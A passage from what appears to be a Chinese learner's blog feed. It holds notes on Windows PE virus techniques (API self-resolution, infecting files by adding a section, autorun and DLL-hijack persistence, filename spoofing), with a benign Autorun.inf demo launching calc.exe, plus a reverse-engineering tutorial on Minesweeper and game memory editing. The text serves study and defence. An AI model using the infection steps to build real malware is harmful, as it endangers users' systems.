title="call指令的作用"><p>ebp是基址指针寄存器，总是指向系统栈最上面栈帧的底部。eip是指令指针寄存器，存放要执行的下一条指令的地址。</p><p>我们已经知道了call指令的功能，接下来就是利用call指令求得插入感染对象后的病毒起始位置。<strong>所以怎么利用？？变量delta也是在病毒里面的啊，与Var1有什么区别</strong></p><img src="/posts/adc1352a/3.3.3.png" class="" title="利用call指令"><h3 id="3-3-2-API函数自获取"><a href="#3-3-2-API函数自获取" class="headerlink" title="3.3.2 API函数自获取"></a>3.3.2 API函数自获取</h3><p>PE文件函数节的功能：当调用外部DLL中的API函数时，通过导入函数节这种关系定义出来，系统加载时就能加载对应的DLL文件并找到相应的API函数，再将地址写入到PE文件的导入函数表中，程序运行时就知道从导入函数表中取地址进行调用，这是正常的PE文件运行过程。通常函数节是由目标程序作者编写。</p><p>但对于病毒程序来说，它是一段代码，当它感染另外一个程序时，它是否能修改目标程序的导入函数节，而使得其可以服务病毒代码呢？理论上是可以的，但非常复杂，因为要在导入函数节添加东西一定会导致其它结构的变化，需要做很多的修正工作，这也可能破坏原有功能。所以对于病毒来说，它需要自己去获取API函数地址，并且没有导入函数节的支撑，但它又必须要使用很多API函数来实现病毒功能。</p><ul><li>关键点：需要使用API函数，但没有导入函数节支撑</li><li>shellcode类似：需要使用API函数自获取技术来确定注入远程系统的位置</li></ul><p><strong>如何获取API函数地址呢？</strong>有以下几种方法：</p><ul><li><p>搜寻宿主的导入表获得<code>GetModuleHandleA()</code>函数和<code>GetProcAddress()</code>函数的地址，然后通过它返回系统DLL的基址。因为很多程序都要使用这两个函数，因此在某些情况下是可行的。如果宿主没有使用<code>GetProcAddress()</code>，那就不得不搜寻导出表了</p></li><li><p>直接获得<code>kernel32.dll</code>的基址，然后再搜寻其导出表获得<code>GetProcAddress()</code>和<code>LoadLibraryA()</code>的地址，就能得到任何想调用的函数地址</p></li><li>硬编码调用函数，比如在9X下<code>GetModuleHandleA()</code>的地址一般是<code>BFF7xxxx</code></li></ul><p>第一种和第三种方法存在兼容性问题，第一种方法局限于目标程序使用<code>GetProcAddress()</code>函数；第三种方法存在硬编码的问题，操作系统不同就不能运行了。</p><ul><li><code>GetProcAddress()</code>函数：包括两个参数，模块基地址和想要获取的API函数名称，它将动态获得DLL函数的入口地址。</li><li><code>LoadLibraryA()</code>函数：将指定的DLL加载到内存中，返回值为DLL文件加载到内存中的基地址。</li></ul><p>明确采用第二种方法后，接下来的步骤就是获取<code>kernel32.dll</code>的基地址，通过<code>kernel32.dll</code>模块中的相应结构和特征定位。典型方法：定位<code>kernel32.dll</code>模块中任意一个地址，然后按照模块首地址特征(对齐于1000H，PE文件开始标识MZ)向低地址遍历定位PE文件头。</p><p><code>kernel32.dll</code>中任意一个地址从哪里获得？</p><ul><li>程序入口代码执行时栈顶存储的地址</li><li>SEH(结构化异常处理)链末端</li><li>PEB(进程环境块)相关数据结构指向了各模块的地址</li><li>栈中特定高端地址的数据</li></ul><p>注意：不同操作系统存在差别。</p><img src="/posts/adc1352a/3.3.4.png" class="" title="程序入口代码栈顶存储的地址"><p><strong>这个还是没说明白，看有没有合适的例子吧</strong></p><h3 id="3-3-3-目标程序遍历搜索"><a href="#3-3-3-目标程序遍历搜索" class="headerlink" title="3.3.3 目标程序遍历搜索"></a>3.3.3 目标程序遍历搜索</h3><p>通常以PE文件格式的文件(如EXE、DLL、SCR等)作为感染目标，其关键点为全盘查找或者部分盘符查找，遍历算法包括递归或非递归。在对目标进行搜索时，通常调用两个API函数：<code>FindFirstFile()</code>和<code>FindNextFile()</code>。</p><p>搜索目标进行感染算法如下：</p><ol><li>指定查找的目录为当前工作目录</li><li>开始搜索文件(*.*)</li><li>该目录搜索完毕？是则返回，否则继续</li><li>找到文件还是目录？目录则调用自身函数(也就是递归)，否则继续</li><li>是文件，如符合感染条件，则调用感染模块，否则继续</li><li>搜索下一个文件(<code>FindNextFile()</code>)，转到3继续</li></ol><h3 id="3-3-4-文件感染"><a href="#3-3-4-文件感染" class="headerlink" title="3.3.4 文件感染"></a>3.3.4 文件感染</h3><p>感染的关键是病毒代码能够得到运行，常用方法包括：</p><ul><li>选择合适的位置放入病毒代码(已有节、新增节)</li><li>将控制权交给病毒代码，如修改程序入口点<code>AddressofEntryPonit</code>，或者在原目标代码执行过程中运行病毒代码(EPO(EntryPoint Obscuring)技术)</li></ul><p>同时，病毒代码执行时，程序的正常功能不能被破坏，即控制权的交换。</p><ul><li>感染时，记录原始“程序控制点位置”</li><li>病毒代码执行完毕之后，返回控制权</li><li>避免重复感染，感染标记</li></ul><h4 id="3-3-4-1-文件感染分类"><a href="#3-3-4-1-文件感染分类" class="headerlink" title="3.3.4.1 文件感染分类"></a>3.3.4.1 文件感染分类</h4><ul><li>插入式感染：将病毒代码插入到Host文件的代码节的中间或前后。这种感染方式会增加代码节的大小，并且可能修改Host程序中的一些参数实际位置，导致Host程序运行失败。</li><li>伴随式感染：备份Host程序，用自身替换Host程序。当病毒执行完毕后，再将控制权交给备份程序。</li></ul><h4 id="3-3-4-2-感染文件基本步骤"><a href="#3-3-4-2-感染文件基本步骤" class="headerlink" title="3.3.4.2 感染文件基本步骤"></a>3.3.4.2 感染文件基本步骤</h4><ol><li><p>判断目标文件开始2字节是否为“MZ”</p></li><li><p>判断PE文件标记“PE”</p></li><li><p>判断感染标记，如果已被感染过则跳出继续执行Host程序，否则继续</p></li><li><p>获得数据目录的个数(每个数据目录信息占8个字节)</p></li><li><p>得到节表起始位置(数据目录的偏移地址 + 数据目录占用的字节数 = 节表起始地址)</p></li><li><p>得到目前最后节表的末尾偏移(紧接其后用于写入一个新的病毒节)</p><p>节表起始位置 + 节的个数 = 目前最后节表的末尾偏移</p><p>每个节表占用的字节数为0x28</p></li><li><p>写入节表和病毒节</p></li><li><p>修正文件头信息</p></li></ol><h1 id="4-捆绑释放型"><a href="#4-捆绑释放型" class="headerlink" title="4. 捆绑释放型"></a>4. 捆绑释放型</h1><p>捆绑释放型感染实现起来比较简单，目前很大一部分病毒程序都采用这种方法。捆绑释放型病毒感染时将目标Host程序作为数据存储在病毒体内，当执行病毒程序时，它先执行病毒程序，然后还原并执行Host文件，从而保证被感染的程序本身能正常运行，不会引起异样。</p><p>熊猫烧香就属于这一类病毒。如下图，左边是一个正常程序，感染后(右边)会将病毒放在前面，正常程序放在后面。程序运行时，病毒会拿到控制权，但是程序图标会显示前面的病毒程序，这也是一个明显的被感染特征。</p><img src="/posts/adc1352a/4.1.1.png" class="" title="捆绑释放型病毒"><ul><li>优点：编写简单、效率高，可感染自校验程序</li><li>缺点：被感染后的程序主体是病毒程序，易被发现(程序叠加+释放执行)，程序图标问题</li></ul><h1 id="5-系统感染型"><a href="#5-系统感染型" class="headerlink" title="5. 系统感染型"></a>5. 系统感染型</h1><p>系统感染型本身不对PE文件做任何感染操作，但它感染的目标是操作系统，也是一种寄生类的方式，只是寄生目标有所不同。这类病毒通常为独立个体，不感染系统内的其它文件。</p><p>系统感染型病毒存在两个两个关键问题：</p><ul><li><p>如何再次获得控制权——自启动</p><p>由于该程序不感染PE文件，它没有Host文件，所以如何再次获得控制权是一个关键性问题，也是目标很多病毒程序设计时不得不考虑的问题。此时和操作系统自启动相关，病毒必须依赖于该机制再次获得控制权。</p></li><li><p>如何传播：可移动存储介质(U盘、移动硬盘、刻录光盘等)、网络共享、电子邮件或其它应用。</p></li></ul><h2 id="5-1-控制权再次获取"><a href="#5-1-控制权再次获取" class="headerlink" title="5.1 控制权再次获取"></a>5.1 控制权再次获取</h2><p>操作系统启动流程：BIOS -&gt; 硬盘MBR -&gt; 活动分区DBR -&gt; 系统内部</p><p>操作系统整个启动流程也是控制权传递的过程，包括现在提出的可信计算，也是对控制权一步一步地校验，控制流程的数据完整性或行为的校验。对于操作系统本身，它的启动方式很多，系统内部包括：</p><ul><li>注册表中的键值</li><li>系统中的特定位置</li><li>配置文件</li><li>特定路径的特定文件，如<code>Explorer.exe</code>(显示桌面)</li></ul><p>如果病毒本身能很好地结合这套机制，它可以做的事情非常多，并且具有很好的隐蔽性。</p><p>其它启动方式：</p><ul><li><p>利用系统自动播放机制<code>Autorun.inf</code></p><p>比如U盘病毒或光盘病毒就是利用U盘或光盘的自动播放功能。目前，也有一些U盘插入后，不需要用户双击U盘，里面的程序也会启动。</p></li><li><p>在其它可执行文件嵌入少量触发代码</p><ul><li>修改导入函数节启动DLL病毒文件(添加相应结构，初始化代码触发)</li><li>在特定PE文件代码段插入触发代码等(只需定位可执行程序并运行)</li></ul></li><li><p>DLL劫持：替换已有DLL文件</p><p>很多应用程序或操作系统执行时，都会去执行DLL文件，如果病毒将自身做成一个DLL文件，同时将系统DLL文件替换。可想而知，系统启动时，它会根据文件名启动的，此时病毒DLL文件就会拿到控制权，如果拿到控制权之后再进一步装载原始DLL文件，这样系统的本身机制也不会受到影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的DLL文件替换。</p></li></ul><h2 id="5-2-病毒的传播方式"><a href="#5-2-病毒的传播方式" class="headerlink" title="5.2 病毒的传播方式"></a>5.2 病毒的传播方式</h2><p>一切可对外交互的渠道都可传播，包括：</p><ul><li>各类存储设备(软盘、光盘、U盘、移动硬盘、智能设备)</li><li>各类网络通信方式(QQ、MSN、Email、淘宝旺旺、微信、微博等)</li><li>各类网络连接方式(有线、WIFI、蓝牙等)</li><li>各类网络应用(迅雷、BT等)</li></ul><p>邮件蠕虫越来越常见，其中以邮件附件的形式进行传播较多。附件中可能包含病毒包括exe文件、rar文件、pdf文件、doc文件、xls文件、jpg文件、chm文件等。下图是一个包含病毒的邮件附件，显示为一个word文档，后缀名doc，图标显示也是word。但它的真实后缀是scr(屏保)，它其实是利用了一种技术，在文件名里插入翻转字符，然后将翻转字符之后的其它字符进行了翻转，它的完整文件名应该是“5月TW行lmcod.scr”。这也是一种欺骗性很强的攻击手法。</p><img src="/posts/adc1352a/5.2.1.png" class="" title="包含病毒的邮件附件"><p>再补充一个通过可移动存储设备传播的非感染式病毒，即<code>Autorun.inf</code>。下图显示了<code>Autorun.inf</code>文件，如果文件存在U盘根目录，当我们双击这个U盘时，它就会触发对应的病毒，如果选择U盘盘符右键打开或打开资源管理器，这时进入的也是病毒程序。当然下面的演示是计算器程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[AutoRun]</span><br><span class="line">open=mspaint.exe</span><br><span class="line">shell\open=打开(&amp;O)</span><br><span class="line">shell\open\Command=calc.exe</span><br><span class="line">shell\open\Default=1</span><br><span class="line">shell\explore=资源管理器(&amp;X)</span><br><span class="line">shell\explore\Command=calc.exe</span><br></pre></td></tr></table></figure><img src="/posts/adc1352a/5.2.2.png" class="" title="Autorun.inf"><p>还有一类是伪装的文件夹，如下图所示的<code>photo.exe</code>文件，当Windows操作系统默认不显示<code>.exe</code>时，它就能伪装成文件夹，当我们双击之后就会运行病毒，同时可以打开某个文件夹进行隐蔽。</p><img src="/posts/adc1352a/5.2.3.png" class="" title="photo.exe"><p>最后，补充“摆渡”知识点，这种攻击行为经常发生在一些具有特殊目的病毒程序身上。期望通过可移动的媒介来渗透一些平时不联网的电脑中，并从中获取数据，利用摆渡的方式植入病毒或木马到内网，比较典型的案例就是Stuxnet。</p><p>下图展示了Stuxnet震网事件的漏洞利用过程和启动方式，传统的Autorun方式很容易被禁止掉，而Stuxnet利用的是lnk漏洞（MS10-046），它会在目标U盘下放入lnk快捷方式及病毒程序（如DLL文件）。不管通过什么方式进入U盘，lnk文件都会被解析从而触发漏洞，导致U盘中的病毒程序被执行。</p><img src="/posts/adc1352a/5.2.4.png" class="" title="Stuxnet震网事件">]]></content>
    
    
    <summary type="html">&lt;p&gt;以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向分析基础</title>
    <link href="http://example.com/posts/8ba499c5.html"/>
    <id>http://example.com/posts/8ba499c5.html</id>
    <published>2022-05-21T00:41:19.909Z</published>
    <updated>2022-05-23T04:43:09.764Z</updated>
    
    <content type="html"><![CDATA[<p>现在就要跟随 <a href="https://blog.csdn.net/Eastmount">Eastmount</a> 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！</p><span id="more"></span><h1 id="1-逆向分析学习路线"><a href="#1-逆向分析学习路线" class="headerlink" title="1. 逆向分析学习路线"></a>1. 逆向分析学习路线</h1><img src="/posts/8ba499c5/%E5%AD%A6%E4%B9%A0%E6%8A%80%E8%83%BD%E5%9B%BE.png" class="" title="逆向分析学习路线"><h1 id="2-逆向分析的典型应用"><a href="#2-逆向分析的典型应用" class="headerlink" title="2. 逆向分析的典型应用"></a>2. 逆向分析的典型应用</h1><h2 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h2><p>逆向分析主要是剖析病毒，包括：</p><ul><li>获取病毒传播方法，遏制病毒传播</li><li>获取病毒隐藏手段，根除病毒</li><li>获取功能目的，溯源定位攻击者</li></ul><h2 id="2-2-游戏保护"><a href="#2-2-游戏保护" class="headerlink" title="2.2 游戏保护"></a>2.2 游戏保护</h2><p>这个主要是用来做游戏外挂。比如修改攻击力、防御值、金币等。</p><h2 id="2-3-漏洞挖掘"><a href="#2-3-漏洞挖掘" class="headerlink" title="2.3 漏洞挖掘"></a>2.3 漏洞挖掘</h2><p>逆向应用还包括漏洞挖掘和漏洞利用，其中黑客挖掘漏洞的常用方法为：</p><ul><li>通过分析开源软件的源代码，获取漏洞</li><li>通过分析产品本身，获取漏洞</li><li>通过分析可以利用漏洞的软件样本</li><li>通过比较软件前后补丁的差异</li></ul><p>比如官方软件在网上有安全更新，关注安全行情和漏洞公告的行当或企业会对比官方的补丁，在拿到官方升级后的软件，他们会对两个软件流程作比较，分析补丁补了哪里，再详细分析为什么多了这个检测。注意，官方公告通常会非常简略(补丁号、造成后果、影响范围)。比如某个MP3播放器在播放某个冷门格式的音频文件时，会触发一个远程溢出问题，我们就需要去逆向分析，下载升级前后版本做流程对比。</p><h2 id="2-4-电子取证"><a href="#2-4-电子取证" class="headerlink" title="2.4 电子取证"></a>2.4 电子取证</h2><p>通过样本试图找出是谁(Who)、在什么时间(When)、在哪里(Where)、怎样地(How)进行了什么(What)(非法)活动。</p><h2 id="2-5-无文档学习"><a href="#2-5-无文档学习" class="headerlink" title="2.5 无文档学习"></a>2.5 无文档学习</h2><p>表示没有源码的情况下获取程序信息，称为竞品分析。假设某个公司对同行的产品很感兴趣，想知道为什么他们的算法比我们好，然后需要去分析和算法还原，这也是逆向分析的主要应用。</p><h1 id="3-扫雷游戏逆向分析"><a href="#3-扫雷游戏逆向分析" class="headerlink" title="3. 扫雷游戏逆向分析"></a>3. 扫雷游戏逆向分析</h1><img src="/posts/8ba499c5/2.1.png" class="" title="扫雷"><p>扫雷中肯定有雷区的定义，作为程序员，你会怎样定义有雷或无雷，或者插旗子状态呢？我们会使用一个二维数组来存储。那么，什么时候肯定会访问这个二维数组呢？在绘制整个游戏区、点击方格的时候都会访问到。</p><p>在绘制游戏区时，Windows编程有个关键函数<code>BeginPaint()</code>，它为指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个<code>PAINTSTRUCT</code>结构中，所以它将是一个突破口。</p><p>在逆向分析中，动态分析和静态分析非常多，动静结合也是常用的分析手段。</p><ul><li>静态分析：程序并未运行，通过分析文件的结构(格式)获取其内部原理。</li><li>动态分析：在程序的运行过程中，分析其内部原理。</li><li>灰盒分析：既不静态也不动态调试，通过一堆监控软件(注册表监控、文件监控、进程监控、敏感API监控)在虚拟机中跑程序，再分析恶意软件的大体行为，并形成病毒分析报告。</li></ul><p>至于哪种方法更好？具体问题具体分析。如果分析扫雷，因为没有危害可以动态调试，但如果是WannaCry蠕虫，就不能在真机上动态调试。同时，很多安全公司为了及时响应各种安全事件，会把样本自动上传到服务器中，他们每天会收到成千上万的恶意样本，但可能存在某些未知样本只上传部分的原因，比如某个未知样本是个动态链接库，此时没有运行条件，只能进行静态分析或者模拟接口分析。</p><h2 id="3-1-OD动态分析"><a href="#3-1-OD动态分析" class="headerlink" title="3.1 OD动态分析"></a>3.1 OD动态分析</h2><p>我们采用动态分析的方法分析扫雷程序。之前我们猜测游戏中存在一个二维数组，当我们显示界面时会访问这个二维数组，并且调用<code>BeginPaint()</code>函数来显示页面，所以接下来需要找到调用<code>BeginPaint()</code>的位置。</p><p>将程序载入OD，Ctrl + N 查找当前模块中的名称，输入<code>BeginPaint</code>，右键 -&gt; 在每个参考上设置断点。</p><img src="/posts/8ba499c5/2.1.1.png" class="" title="查找BeginPaint"><p>Alt + B 去到断点窗口，发现只有一个。F9 运行程序至断点处，此时程序界面还没出来。</p><img src="/posts/8ba499c5/2.1.2.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现<code>BeginPaint()</code>函数下面还有一个<code>EndPaint()</code>，表示绘图结束，也就是游戏结束。所以这两个函数之间的数据就是我们玩游戏的过程。两个系统函数之间只有一个程序函数<code>01002AC3()</code>，选中该行 Enter 跟随该函数。</p><img src="/posts/8ba499c5/2.1.3.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现这里面也有几个程序函数，一个个看后发现只有<code>010026A7()</code>里有双重循环，也就是构成二维数组的基本条件。</p><p>当然，这种方法太过草率也太耗费时间了，如果遇到大一点的程序，工作量还是挺大的。可以使用另一种方法。当我们在玩扫雷时，它的界面并没有闪烁，所以怀疑使用了双缓存技术。</p><p>双缓存是在缓存中一次性绘制，再把绘制的结果返回到界面上。比如要在屏幕上绘制一个圆、正方形、直线，需要调用GDI的显示函数，操作显卡画一个圆，再画一个正方形、一条直线，需要访问硬件3次，此时依赖硬件的访问速度。为了减少硬件操作，我们在内存中把需要绘制的图像准备好，一切妥当后再提交给硬件显示。</p><p><code>BitBlt()</code>函数是将内存中的数据提交到显示器上，该函数对指定的源设备环境区域中的像素进行位块转换，以传送到目标设备环境。同样方法查找<code>BitBlt()</code>函数，设置断点，运行，程序停在了<code>010026A7()</code>函数里的<code>BitBlt()</code>函数中。需要注意的是，调用<code>BitBlt()</code>函数有两处地方，为了验证这里是否是我们要找的地方，可以单步调试看看游戏界面情况。</p><img src="/posts/8ba499c5/2.1.4.png" class="" title="单步数次执行的界面情况"><p>绘制一个个方块的过程，也就是初始化“有雷”和“无雷”的过程，说明我们之前找的地方没错。</p><p>另一处调用<code>BitBlt()</code>函数，是点击方块时，绘制该方块是“数字”还是“雷”的过程。这时候只是将这个过程显示在用户界面上，对我们来说只是一个验证作用。</p><p><code>010026A7()</code>函数里的<code>BitBlt()</code>函数在界面初始化“有雷”和“无雷”，那肯定将这些数据存在了某个地方。接下来就是分析这双重循环。</p><img src="/posts/8ba499c5/2.1.5.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.6.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.7.png" class="" title="分析双重循环"><p>经过<code>mov al,byte ptr ds:[ebx+esi]</code>可以知道al的值是取数据段寄存器中以ebx为基址，esi为偏移的地址的内容。</p><img src="/posts/8ba499c5/2.1.8.png" class="" title="分析双重循环"><p>所以ebx存的就是“有雷”和“无雷”二维数组的首地址。我们知道，一行有9个方块，根据规律可以猜测，<code>10</code>作为边界，<code>0F</code>表示空，<code>8F</code>就是雷。</p><p>将所有断点取消，数据窗口 Ctrl + G 定位到地址<code>01005360</code>，验证猜测。</p><p>注意，如果第一次点击的就是雷的话，会改变雷的位置(可能是避免倒霉孩子没有游戏体验吧)。如果方块中是旗子显示<code>8E</code>，方块中是空白显示<code>40</code>，方块中是1则显示<code>41</code>，2是<code>42</code>，以此类推。雷被点中后将<code>8F</code>改为<code>CC</code>，将剩余的雷改为<code>8A</code>。经过多次游戏，证实了上面的猜测。</p><img src="/posts/8ba499c5/2.1.9.png" class="" title="分析双重循环"><h2 id="3-2-逆向辅助工具CE"><a href="#3-2-逆向辅助工具CE" class="headerlink" title="3.2 逆向辅助工具CE"></a>3.2 逆向辅助工具CE</h2><p>Cheat Engine又称CE修改器，是一款内存修改编辑工具。可以通过Cheat Engine来修改游戏中的内存数据、人物属性、金币数值等等。</p><p>我们现在的目的是利用CE获取第一个方块的地址，验证与在OD找的是否一致。运行扫雷，打开CE，附加扫雷进程。在OD中看，一个字节存储在一个方块中，所以将数值类型设为“字节”，扫描类型设为“未知的初始数值”，首次扫描。</p><img src="/posts/8ba499c5/2.2.1.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.2.png" class="" title="CE使用"><p>此时显示1056768个数据。接着点击第一个方块，该方块由<code>0F</code>变为<code>40</code>，所以在扫描类型中选择“变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.3.png" class="" title="CE使用"><p>点击扫雷，由于第一个方块不再变化数值，所以选择“未变动的数值”进行筛选，再次扫描，连续几次，发现数据的个数一直在变小，说明经过几轮筛选逐渐缩小范围。如果出现地雷则选择“未变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.4.png" class="" title="CE使用"><p>点击笑脸重新开始游戏，此时第一个方块从<code>40</code>变为<code>0F</code>，所以扫描类型修改为“变动的数值”，再次扫描。</p><p>重复上述步骤，直到结果为1。</p><img src="/posts/8ba499c5/2.2.5.png" class="" title="CE使用"><p>这个地址刚好是我们在OD中找的第一个方块的地址。</p><img src="/posts/8ba499c5/2.2.6.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.7.png" class="" title="CE使用"><p>第二步验证扫雷的边界。自定义扫雷的高度为9，扫出来有1627个数据。再次定义高度为16，从9变到16的数据有4个。再次定义高度为24，从16变到24的有2个。因为边界需要两个值来定义，所以就是<code>01005338</code>和<code>010056A8</code>。</p><img src="/posts/8ba499c5/2.2.8.png" class="" title="CE使用"><p>同样筛选出存储宽度的地址，分别是<code>01005334</code>和<code>010056AC</code>。筛选出雷数的存储地址为<code>01005330</code>。</p><p>后面就可以利用这些地址开始学习研究了，比如一秒实现扫雷等。</p><h1 id="4-吕布传游戏逆向分析"><a href="#4-吕布传游戏逆向分析" class="headerlink" title="4. 吕布传游戏逆向分析"></a>4. 吕布传游戏逆向分析</h1><p>关于NPC说话太慢，找到快速跳过对话的方法。</p><p>将<code>Ekd5.exe</code>载入OD，查找当前模块中的名称，查看调用了哪些函数。发现程序竟然有几个钩子函数。</p><img src="/posts/8ba499c5/4.1.1.png" class="" title="查看调用函数"><p>钩子函数是Windows消息处理机制的一部分，通过设置“钩子”，应用程序可以在系统级对所有消息、事件进行过滤，访问在正常情况下无法访问的消息。钩子的本质是一段用以处理系统消息的程序，通过系统调用，把它挂入系统。</p><ul><li>SetWindowsHookEx：设置钩子函数</li><li>CallNextHookEx：将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</li><li>UnhookWindowsHookEx：上一个函数<code>SetWindowsHookEx()</code>的返回值，钩子在使用完之后需要用该函数卸载</li></ul><p>在每个<code>SetWindowsHookEx()</code>处下断，一共两处。运行，停在了<code>00429EF7</code>处。可以看到该钩子函数是通过键盘输入触发，回调函数的地址为<code>0040D307</code>，也就是触发后会去到该地址处。</p><p>Ctrl + G 去到该地址处，下断，运行。游戏载入，随意从键盘上输入。</p><img src="/posts/8ba499c5/4.1.2.png" class="" title="游戏界面"><p>此时触发钩子函数，使汇编去到<code>0040D307</code>处。我输入的是“a”，运行到cmp指令时，eax存的值就是“a”的ASCII码的十六进制形式，与<code>0x20</code>(空格)进行对比，往下看还有与<code>0x30</code>(“0”)、<code>0x35</code>(“5”)对比的。</p><img src="/posts/8ba499c5/4.1.3.png" class="" title="eax对比"><p>先看<code>0x20</code>。重载运行，在键盘按下空格键。对比通过，进入<code>00406A33</code>函数，这个函数里有一个创建线程函数，线程在<code>00406A7F</code>处。继续跟随到该地址，下断运行。</p><img src="/posts/8ba499c5/4.1.4.png" class="" title="创建线程函数"><p>在<code>00406A7F</code>函数中，有两个<code>PostMessage()</code>函数，该函数的作用是将一条消息放入消息队列中。一个是“鼠标按下”，另一个是“鼠标弹起”，中间还有个<code>sleep()</code>函数，这个过程是模拟玩家点击鼠标的操作。</p><img src="/posts/8ba499c5/4.1.5.png" class="" title="PostMessage函数"><p>那么，我们就找到了一个快速跳过对话的方法，就是按空格键。要想取消快速对话，同样也是按空格键。<code>ds:[0x500E02]</code>中存储着跳过与否的值，“1”表示快速跳过，“0”表示不跳过。</p><p><code>0x30</code>(“0”)、<code>0x35</code>(“5”)没什么用的，可能只是过滤玩家的不合法输入。</p><h1 id="5-植物大战僵尸游戏逆向分析"><a href="#5-植物大战僵尸游戏逆向分析" class="headerlink" title="5. 植物大战僵尸游戏逆向分析"></a>5. 植物大战僵尸游戏逆向分析</h1><h2 id="5-1-CE逆向修改阳光值"><a href="#5-1-CE逆向修改阳光值" class="headerlink" title="5.1 CE逆向修改阳光值"></a>5.1 CE逆向修改阳光值</h2><p>修改阳光值首先要知道存储阳光值的地址在哪里。通过CE找到该地址，为<code>25B42938</code>。</p><img src="/posts/8ba499c5/5.1.1.png" class="" title="CE查找存储阳光值的地址"><p>打开资源管理器，查看这个游戏的进程ID，为12064。</p><img src="/posts/8ba499c5/5.1.2.png" class="" title="CE查找存储阳光值的地址"><p>在修改阳光值之前，要先确定我们要修改值的窗口是哪一个，可以通过API函数<code>FindWindow()</code>来查找。这个函数检索处理顶级窗口的类名和窗口名称匹配指定的字符串，这个函数不搜索子窗口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">FindWindow</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpClassName,</span></span><br><span class="line"><span class="params">    LPCSTR lpWindowName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>lpClassName：指向一个以NULL字符结尾的、用来指定类名的字符串或一个可以确定类名字符串的原子。如果该参数为null时，将会寻找任何与<code>lpWindowName</code>参数匹配的窗口。</li><li>lpWindowName：指向一个以NULL字符结尾的、用来指定窗口名（即窗口标题）的字符串。如果此参数为null，则匹配所有窗口名。</li></ul><p><code>FindWindow()</code>需要传入两个参数，即窗口的类型和窗口的标题。这里可以用到Visual Studio中的Spy++工具来查看在本机中运行的窗口的相关信息。</p><img src="/posts/8ba499c5/5.1.3.jpg" class="" title="CE查找存储阳光值的地址"><img src="/posts/8ba499c5/5.1.4.png" class="" title="CE查找存储阳光值的地址"><p>句柄为<code>00600BEE</code>，标题为<code>Plants vs. Zombies 1.2.0.1073 RELEASE</code>，类为<code>MainWindow</code>。</p><p>当然，每次运行的句柄和进程ID都不一样，千万不要把这两个值写死，而是通过API函数自动获取这些信息。</p><p>接下来介绍几个等下要用到的API函数：</p><ul><li>通过<code>GetWindowThreadProcessld()</code>函数找到进程ID。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetWindowThreadProcessld</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hwnd,                   <span class="comment">//窗口句柄</span></span></span><br><span class="line"><span class="params">LPDWORD lpdwProcessld        <span class="comment">//接收进程标识的32位值的地址</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>通过<code>OpenProcess()</code>函数打开一个已存在的进程对象，并返回进程的句柄。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">DWORD dwDesiredAccess,   <span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">BOOL bInheritHandle,     <span class="comment">//是否继承句柄</span></span></span><br><span class="line"><span class="params">DWORD dwProcessId        <span class="comment">//进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>dwDesiredAccess</code>可分为以下几种：</p><div class="table-container"><table><thead><tr><th>字段值</th><th>含义</th></tr></thead><tbody><tr><td>PROCESS_ALL_ACCESS</td><td>获取所有权限</td></tr><tr><td>PROCESS_CREATE_PROCESS</td><td>创建进程</td></tr><tr><td>PROCESS_CREATE_THREAD</td><td>创建线程</td></tr><tr><td>PROCESS_DUP_HANDLE</td><td>使用DuplicateHandle()函数复制一个新句柄</td></tr><tr><td>PROCESS_QUERY_INFORMATION</td><td>获取进程的令牌、退出码和优先级等信息</td></tr><tr><td>PROCESS_QUERY_LIMITED_INFORMATION</td><td>获取进程特定的某个信息</td></tr><tr><td>PROCESS_SET_INFORMATION</td><td>设置进程的某种信息</td></tr><tr><td>PROCESS_SET_QUOTA</td><td>使用SetProcessWorkingSetSize()函数设置内存限制</td></tr><tr><td>PROCESS_SUSPEND_RESUME</td><td>暂停或者恢复一个进程</td></tr><tr><td>PROCESS_TERMINATE</td><td>使用Terminate()函数终止进程</td></tr><tr><td>PROCESS_VM_OPERATION</td><td>在进程的地址空间执行操作</td></tr><tr><td>PROCESS_VM_READ</td><td>使用ReadProcessMemory()函数在进程中读取内存</td></tr><tr><td>PROCESS_VM_WRITE</td><td>使用WriteProcessMemory()函数在进程中写入内存</td